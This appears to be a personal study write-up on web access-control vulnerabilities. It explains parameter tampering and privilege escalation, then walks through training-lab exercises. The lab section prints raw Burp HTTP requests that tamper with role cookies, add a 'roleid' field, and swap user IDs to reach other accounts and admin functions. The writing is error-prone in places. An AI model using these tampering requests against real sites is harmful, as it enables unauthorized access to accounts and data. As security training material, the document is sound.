## Access control vulnerabilities
Access control (or authorization) is the application of constraints on who (or what) 
can perform attempted actions or access resources that they have requested. 
In the context of web applications, access control is dependent on authentication and session management: 

## 1. Parameter-based access control methods
Some applications determine the user's access rights or role at login, and then store this information in a user-controllable location,
such as a hidden field, cookie, or preset query string parameter. 
The application makes subsequent access control decisions based on the submitted value

## For Example

    https://insecure-website.com/login/home.jsp?admin=true
    https://insecure-website.com/login/home.jsp?role=1

This approach is fundamentally insecure because a user can simply modify the value and gain access to functionality to which they are not authorized,
such as administrative functions. 

## 2. Horizontal privilege escalation
Horizontal privilege escalation arises when a user is able to gain access to resources belonging to another user, instead of their own resources of that type. For example, if an employee should only be able to access their own employment and payroll records, but can in fact also access the records of other employees, then this is horizontal privilege escalation. 

 Horizontal privilege escalation attacks may use similar types of exploit methods to vertical privilege escalation. 
 ## For example
 a user might ordinarily access their own account page using a URL like the following: 

    https://insecure-website.com/myaccount?id=123
Now, if an attacker modifies the id parameter value to that of another user, then the attacker might gain access to another user's account page, with associated data and functions. 

## 3. Horizontal to vertical privilege escalation
Often, a horizontal privilege escalation attack can be turned into a vertical privilege escalation, by compromising a more privileged user.
For example, a horizontal escalation might allow an attacker to reset or capture the password belonging to another user.
If the attacker targets an administrative user and compromises their account, then they can gain administrative access and so perform vertical privilege escalation.

## For Example
an attacker might be able to gain access to another user's account page using the parameter tampering technique already described for horizontal privilege escalation:

    https://insecure-website.com/myaccount?id=456
    
If the target user is an application administrator, then the attacker will gain access to an administrative account page. This page might disclose the administrator's password or provide a means of changing it, or might provide direct access to privileged functionality. 
    
    
## LAB
 
 ## 1. STEP
  Asif Is Upgrade User 
  Login in the login page and Caputer The Request In Burp Repeter and  analyze the Request
    
    POST /admin-roles HTTP/1.1
    Host: acca1f871ff59314c0b1124d00580002.web-security-academy.net
    Cookie: session=dhb7aRHg7lEnRb2uRogyfXu2onwMp2jY
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 45
    Origin: https://acca1f871ff59314c0b1124d00580002.web-security-academy.net
    Referer: https://acca1f871ff59314c0b1124d00580002.web-security-academy.net/admin-roles
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    action=upgrade&confirmed=true&username=asif
    

 ## 2.STEP
 Khan Is Local user 
 Login in the login page and Caputer The Request In Burp Repeter and  analyze the Request 
 
     GET /my-account?id=khan HTTP/1.1
     Host: acca1f871ff59314c0b1124d00580002.web-security-academy.net
     Cookie: session=ai64aRHg7lEnRb2uadg95Xu2onw98v9f
     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
     Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate
     Referer: https://acca1f871ff59314c0b1124d00580002.web-security-academy.net/my-account
     Upgrade-Insecure-Requests: 1
     Sec-Fetch-Dest: document
     Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

 
  ## 3.STEP 
  First some Changing Copy Local user Cookie: Session and past the Upgrade Request and Secand is Change the Nmae just Example 
  Upgrade user name is Asif to change and type khan and send the Request Server and Local user is Upgrade This vulnerabilities
  IS Access-control-vulnerabilities
 
    POST /admin-roles HTTP/1.1
    Host: acca1f871ff59314c0b1124d00580002.web-security-academy.net
    Cookie: session=dhb7aRHg7lEnRb2uRogyfXu2onwMp2jY
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 45
    Origin: https://acca1f871ff59314c0b1124d00580002.web-security-academy.net
    Referer: https://acca1f871ff59314c0b1124d00580002.web-security-academy.net/admin-roles
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    action=upgrade&confirmed=true&username=asif
    
 
 
 ## 1. User role controlled by request parameter
 
 In Burp Proxy, turn interception on and enable response interception
 
 Complete and submit the login page, and forward the resulting request in Burp.
 
 Observe that the response sets the cookie Admin=false. Change it to Admin=true. 
 
 Acess The directory
 
 
 ## 2. User role can be modified in user profile
 
 Request Sand to repeter 
 
 Observe that the response contains your role ID.
 
 Send the email submission request to Burp Repeater, add "roleid":2 into the JSON in the request body, and resend it. 
 
 Observe that the response shows your roleid has changed to 2.
 
 ## Request 

    POST /my-account/change-email HTTP/1.1
    Host: 0af600bd034d16ccc01622bd007500ff.web-security-academy.net
    Cookie: session=BtwJhdFHvFMf80vO1cbyBAFzL6fR2Ybb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: text/plain;charset=UTF-8
    Content-Length: 37
    Origin: https://0af600bd034d16ccc01622bd007500ff.web-security-academy.net
    Referer: https://0af600bd034d16ccc01622bd007500ff.web-security-academy.net/my-account?id=wiener
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers
    Connection: close

    {"email":"asif@khan.com"}
    
 ## Respotion
 
     HTTP/1.1 302 Found
     Location: /my-account
     Content-Type: application/json; charset=utf-8
     Connection: close
     Content-Length: 117

     {
     "username": "wiener",
     "email": "asif@khan.com",
     "apikey": "NGFEeqrDx0HZQVetlEiJE0KRhlbdsakQ",
     "roleid": 1
     }
    
 So Add the some code 
 
     "roleid":2
     
  Add some code and sand the request 
  
    POST /my-account/change-email HTTP/1.1
    Host: 0aa4005804b0d687c0b734a5008300b5.web-security-academy.net
    Cookie: session=m3KQEsfQs1feSrzPlZLIYH6nocktj0In
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: text/plain;charset=UTF-8
    Content-Length: 38
    Origin: https://0aa4005804b0d687c0b734a5008300b5.web-security-academy.net
    Referer: https://0aa4005804b0d687c0b734a5008300b5.web-security-academy.net/my-account
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers
    Connection: close

    {"email":"asif@khan.com",
     "roleid":2}
     
  Accept the request, This is vulnerable


 ## 3. User ID controlled by request parameter 
 
  Log in using the supplied credentials and go to your account page.
  
  Note that the URL contains your username in the "id" parameter. 
  
  Send the request to Burp Repeater.
  
  Change the "id" parameter and sand the server accept the request, This is vulnerability
  
    GET /my-account?id=asif HTTP/1.1
    Host: 0a3f0064038d99a1c0d1738b007b0085.web-security-academy.net
    Cookie: session=NN4wD7kCq0mi8vnkAdVwEg9TkEMZYlSd
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0a3f0064038d99a1c0d1738b007b0085.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close


 ## Change Parameter ID 
 
     GET /my-account?id=asif HTTP/1.1


## 4. User ID controlled by request parameter, with unpredictable user IDs

   Find a blog post by carlos.
   
   Click on carlos and observe that the URL contains his user ID. Make a note of this ID.
   
   Change the "id" parameter to the saved user ID. 
   
   Accept the request, This is vulnerable
   
 ## Request 
 
    GET /my-account?id=62cae48d-fa7e-43a1-810a-8d3edcb5b449 HTTP/1.1
Host: 0a300096047fe477c0d9261500590058.web-security-academy.net
Cookie: session=wW0hPlgsA25dMoB1jfIJCvY7PiK38r0l
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a300096047fe477c0d9261500590058.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
   
   
   
   
   
   
   
   
   
   

